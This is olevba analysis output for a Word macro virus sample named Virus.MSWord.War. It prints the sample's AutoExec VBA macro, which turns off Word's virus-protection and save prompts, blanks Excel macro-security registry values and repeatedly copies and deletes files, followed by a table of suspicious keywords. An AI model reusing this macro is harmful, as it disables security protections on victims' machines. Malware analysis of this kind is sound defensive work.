olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.War
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.War - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
On Error Resume Next
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
WordBasic.MkDir "c:\Alevirus99"
WordBasic.CopyFile "c:\windows\win.com", "c:\Alevirus99\win.com"
WordBasic.Kill "c:\Alevirus99\*.*"
WordBasic.RmDir "c:\Alevirus99"
System.ProfileString("Options", "EnableMacroVirusProtection") = "0"
WordBasic.MkDir "c:\Alevirus99"
WordBasic.CopyFile "c:\windows\win.com", "c:\Alevirus99\win.com"
WordBasic.Kill "c:\Alevirus99\*.*"
WordBasic.RmDir "c:\Alevirus99"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
WordBasic.MkDir "c:\Alevirus99"
WordBasic.CopyFile "c:\windows\win.com", "c:\Alevirus99\win.com"
WordBasic.Kill "c:\Alevirus99\*.*"
WordBasic.RmDir "c:\Alevirus99"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

